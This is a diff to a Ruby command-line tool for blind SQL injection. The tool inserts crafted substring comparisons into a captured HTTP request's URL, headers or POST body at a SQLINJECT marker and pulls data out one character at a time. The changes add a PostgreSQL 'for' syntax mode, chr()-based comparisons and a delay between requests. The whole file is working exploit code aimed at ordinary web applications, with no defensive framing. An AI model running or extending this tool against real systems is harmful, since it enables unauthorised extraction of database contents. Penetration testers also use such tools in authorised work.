@@ -18,9 +18,10 @@ $proxy_port = "" # proxy port
 $mode = "b" # mode to use (between - b (default - this mode generates less requests), moreless - a (this mode generates less requests by comparing characters using \"<\", \">\", \"=\" characters), like - l (complete bruteforce with like), equals - e (complete bruteforce with =))
 $hex = "n" # if hex should be used in comparing
 
-$max = 1000; # maximum chars to enumerate
-$search = ""; # what is the pattern to look for when query is TRUE
+$max = 1000 # maximum chars to enumerate
+$search = "" # what is the pattern to look for when query is TRUE
 
+$for = "n" # if postgres "for" should be used in substring
 $comma = "n" # if comma should be URL encoded
 $oh = "" # this character is used when opening string when comparing
 $bracket = ")" # substring ending brackets
@@ -31,6 +32,7 @@ $showletter = "y" # if each enumerated letter should be shown
 $verbose = "n" # verbose messaging
 $test = "n" # test mode
 timeout = 20 # timeout for receiving responses
+$sleep = 0 # sleep between requests
 alls = "n" # if all special characters should be included in enumeration
 run = 0 # parameter specifies if program should continue when always true condition is detected
 
@@ -53,8 +55,10 @@ ARGV.each do |arg|
 	$case = "y" if arg.include?("--case")
 	$i = arg.split("=")[1].to_i - 1 if arg.include?("--start=")
 	$test = "y" if arg.include?("--test")
+	$for = "y" if arg.include?("--postgres")
 	$bracket = arg.split("=")[1].to_i - 1 if arg.include?("--bracket=")
 	alls = "y" if arg.include?("--special")
+	$sleep = Integer(arg.split("=")[1]) if arg.include?("--sleep=")
 	$showletter = "n" if arg.include?("--only-final")
 	$hexbracket = "n" if arg.include?("--hexspace")
 	$search = arg.split("=")[1] if arg.include?("--pattern=") && arg.count("=") == 1
@@ -80,6 +84,7 @@ if ARGV.nil? || ARGV.size < 3 || $file == "" || ($search == "" && $test == "n")
 	puts "  --2ndfile	File containing valid HTTP request used in second order exploitation. (--2ndfile=/tmp/2ndreq.txt)"
 	puts ""
 	puts "  --mode	Blind mode to use - (between - b (generates less requests), moreless - a (generates less requests by using \"<\", \">\", \"=\" characters), like - l (complete bruteforce), equals - e (complete bruteforce)). (--mode=l)"
+	puts "  --postgres	Use postgres \"for\" in substring function."
 	puts "  --hex		Use hex to compare instead of characters."
 	puts "  --case	Case sensitivity."
 	puts ""
@@ -91,6 +96,7 @@ if ARGV.nil? || ARGV.size < 3 || $file == "" || ($search == "" && $test == "n")
 	puts "  --start	Start enumeration from specified character. (--start=10)"
 	puts "  --max		Maximum characters to enumerate. (--max=10)"
 	puts "  --timeout	Timeout in waiting for responses. (--timeout=20)"
+	puts "  --sleep	Sleep between requests. (--sleep=5)"
 	puts "  --only-final	Stop showing each enumerated letter."
 	puts "  --comma	Encode comma."
 	puts "  --bracket	Add brackets to the end of substring function. --bracket=\"))\""
@@ -185,7 +191,11 @@ def configreq(chars)
 		if $comma == "y"
 			puts $prepend + $i.to_s + "%2C1" + $bracket + chars.gsub("%", "%25").gsub("&", "%26").gsub("+", "%2B").gsub(";", "%3B").gsub("#", "%23").gsub(" ", "+") + $append
 		else
-			puts $prepend + $i.to_s + ",1" + $bracket + chars.gsub("%", "%25").gsub("&", "%26").gsub("+", "%2B").gsub(";", "%3B").gsub("#", "%23").gsub(" ", "+") + $append
+			if $for == "n"
+				puts $prepend + $i.to_s + ",1" + $bracket + chars.gsub("%", "%25").gsub("&", "%26").gsub("+", "%2B").gsub(";", "%3B").gsub("#", "%23").gsub(" ", "+") + $append
+			else
+				puts $prepend + $i.to_s + " for 1" + $bracket + chars.gsub("%", "%25").gsub("&", "%26").gsub("+", "%2B").gsub(";", "%3B").gsub("#", "%23").gsub(" ", "+") + $append
+			end
 		end
 		exit(1)
 	end
@@ -206,7 +216,11 @@ def configreq(chars)
 		if $comma == "y"
 			$uri = $uri.sub("SQLINJECT", $prepend + $i.to_s + "%2C1" + $bracket + chars.gsub("%", "%25").gsub("&", "%26").gsub("+", "%2B").gsub(";", "%3B").gsub("#", "%23").gsub(" ", "+") + $append)
 		else
-			$uri = $uri.sub("SQLINJECT", $prepend + $i.to_s + ",1" + $bracket + chars.gsub("%", "%25").gsub("&", "%26").gsub("+", "%2B").gsub(";", "%3B").gsub("#", "%23").gsub(" ", "+") + $append)
+			if $for == "n"
+				$uri = $uri.sub("SQLINJECT", $prepend + $i.to_s + ",1" + $bracket + chars.gsub("%", "%25").gsub("&", "%26").gsub("+", "%2B").gsub(";", "%3B").gsub("#", "%23").gsub(" ", "+") + $append)
+			else
+				$uri = $uri.sub("SQLINJECT", $prepend + $i.to_s + " for 1" + $bracket + chars.gsub("%", "%25").gsub("&", "%26").gsub("+", "%2B").gsub(";", "%3B").gsub("#", "%23").gsub(" ", "+") + $append)
+			end
 		end
 		found = found + 1
 	end
@@ -222,7 +236,11 @@ def configreq(chars)
 				if $comma == "y"
 					header = header.sub("SQLINJECT", $prepend + $i.to_s + "%2C1" + $bracket + chars.gsub("%", "%25").gsub("&", "%26").gsub("+", "%2B").gsub(";", "%3B").gsub("#", "%23").gsub(" ", "+") + $append)
 				else
-					header = header.sub("SQLINJECT", $prepend + $i.to_s + ",1" + $bracket + chars.gsub("%", "%25").gsub("&", "%26").gsub("+", "%2B").gsub(";", "%3B").gsub("#", "%23").gsub(" ", "+") + $append)
+					if $for == "n"
+						header = header.sub("SQLINJECT", $prepend + $i.to_s + ",1" + $bracket + chars.gsub("%", "%25").gsub("&", "%26").gsub("+", "%2B").gsub(";", "%3B").gsub("#", "%23").gsub(" ", "+") + $append)
+					else
+						header = header.sub("SQLINJECT", $prepend + $i.to_s + " for 1" + $bracket + chars.gsub("%", "%25").gsub("&", "%26").gsub("+", "%2B").gsub(";", "%3B").gsub("#", "%23").gsub(" ", "+") + $append)
+					end
 				end
 				found = found + 1
 			end
@@ -247,7 +265,11 @@ def configreq(chars)
 				if $comma == "y"
 					postline = postline.sub("SQLINJECT", $prepend + $i.to_s + "%2C1" + $bracket + chars.gsub("%", "%25").gsub("&", "%26").gsub("+", "%2B").gsub(";", "%3B").gsub("#", "%23").gsub(" ", "+") + $append)
 				else
-					postline = postline.sub("SQLINJECT", $prepend + $i.to_s + ",1" + $bracket + chars.gsub("%", "%25").gsub("&", "%26").gsub("+", "%2B").gsub(";", "%3B").gsub("#", "%23").gsub(" ", "+") + $append)
+					if $for == "n"
+						postline = postline.sub("SQLINJECT", $prepend + $i.to_s + ",1" + $bracket + chars.gsub("%", "%25").gsub("&", "%26").gsub("+", "%2B").gsub(";", "%3B").gsub("#", "%23").gsub(" ", "+") + $append)
+					else
+						postline = postline.sub("SQLINJECT", $prepend + $i.to_s + " for 1" + $bracket + chars.gsub("%", "%25").gsub("&", "%26").gsub("+", "%2B").gsub(";", "%3B").gsub("#", "%23").gsub(" ", "+") + $append)
+					end
 				end
 				found = found + 1
 			end
@@ -336,6 +358,10 @@ end
 
 # Sending request
 def sendreq()
+
+	if $sleep != 0
+		sleep($sleep)
+	end
 	
 	if $verbose == "y"
 		puts "Sending request:"
@@ -407,7 +433,9 @@ end
 # create between payload
 def cbetween(a, b, c)
 	if $hex == "y"
-		if $hexbracket == "n"
+		if $for == "y"
+			configreq("between" + " chr(" + a.ord.to_s + ")and chr(" + b.ord.to_s + ")")
+		elsif $hexbracket == "n"
 			configreq("between" + " 0x" + a.unpack('H*')[0] + " and " + "0x" + b.unpack('H*')[0])
 		else
 			configreq("between" + "(0x" + a.unpack('H*')[0] + ")and(" + "0x" + b.unpack('H*')[0] + ")")
@@ -432,7 +460,9 @@ end
 # creating moreless payload
 def cmoreless(a, b, c)
 	if $hex == "y"
-		if $hexbracket == "n"
+		if $for == "y"
+			configreq(a + " chr(" + a.ord.to_s + ")")
+		elsif $hexbracket == "n"
 			configreq(a + " 0x" + b.unpack('H*')[0])
 		else
 			configreq(a + "(0x" + b.unpack('H*')[0] + ")")
@@ -457,7 +487,9 @@ end
 # creating like payload
 def clike(a)
 	if $hex == "y"
-		if $hexbracket == "n"
+		if $for == "y"
+			configreq("like" + " " + "chr(" + a.ord.to_s + ")")
+		elsif $hexbracket == "n"
 			configreq("like" + " " + "0x" + a.unpack('H*')[0])
 		else
 			configreq("like" + "(" + "0x" + a.unpack('H*')[0] + ")")
@@ -482,7 +514,9 @@ end
 # creating equal payload
 def cequal(a)
 	if $hex == "y"
-		if $hexbracket == "n"
+		if $for == "y"
+			configreq("=" + "chr(" + a.ord.to_s + ")")
+		elsif $hexbracket == "n"
 			configreq("=" + "0x" + a.unpack('H*')[0])
 		else
 			configreq("=" + "(0x" + a.unpack('H*')[0] + ")")
@@ -509,7 +543,7 @@ until $i >= $max  do
 	$i = $i + 1
 	$letter = 0
 	if $result == "aaaaa" && run == 0
-        	puts "It seems like your payload gives always true condition. Maybe you should try another parameter\'s value or different payload. Quit (Y/N)?\n";
+        	puts "It seems like your payload gives always true condition. Maybe you should try another parameter\'s value or different payload. Quit (Y/N)?\n"
 		choice = Readline.readline("> ", true)
         		if choice == "y" || choice == "Y"
 				break
